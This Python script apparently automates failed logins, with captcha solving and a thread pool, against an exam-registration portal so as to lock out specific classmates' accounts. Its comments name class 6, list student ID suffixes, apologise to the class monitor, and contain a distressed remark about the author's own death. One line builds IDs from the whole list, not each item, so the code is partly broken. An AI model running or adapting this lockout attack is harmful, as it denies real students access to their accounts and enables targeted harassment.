#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-07-10 12:29:45
LastEditTime: 2021-07-18 00:32:53
Description: (放在笔记本上执行)
Todo: 
'''
'''
弃用MongoDB数据库,改用多线程队列..
'''
# import pymongo




import threading
import queue
from zk_func import *
import time
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor, thread
def main(id):
    '''
    传入考号进行处理,递归至账号锁定
    '''
    try:
        bot = Zkweb()
        code = bot.checkCode()
        if code == False:
            print("id:%s验证码为空!" % (id))
            main(id)
        result = bot.login(code, id)
        if result == False:
            print("%s验证码识别错误%s" % (id, code))
            main(id)
        if result == "PwdError":
            main(id)
        if result == "Locking":
            # 账号成功锁定,写入数据库
            print("当前待处理:%s 已锁定:%s" % (id_queue.qsize(), locking_id.qsize()))
            id_queue.task_done()
            return
        else:
            return
    except Exception as e:
        print("[INFO]发生异常别怕,递归直至成功", e)
        main(id)


def put_new_id():
    new_id = locking_id.get()
    time.sleep(3)
    print("添加新账号!%s" % (new_id))
    id_queue.put(new_id)


if __name__ == "__main__":
    # 遍历生成11个班级的考号信息
    # 21060515080613->中考考号
    # 待处理考号队列
    id_queue = queue.Queue()
    # 已经锁定完的考号队列
    locking_id = queue.Queue()

    # 新建一个线程,每隔20s向处理队列添加新id
    thread_put = threading.Thread(target=put_new_id)
    thread_put.setDaemon(True)
    thread_put.start()

    # 尽力去锁定6班...对不起了班长,对不起了大家,
    # 是不是我死了你们才开心???
    std_idList = ["0619", "0604", "0635", "0611", "0650"]
    for std_id in std_idList:
        id = "2106051508%s" % (std_idList)
        id_queue.put(id)

    # 开线程池处理看看
    with ThreadPoolExecutor() as pool:
        while True:
            id = id_queue.get()
            pool.submit(main, id)
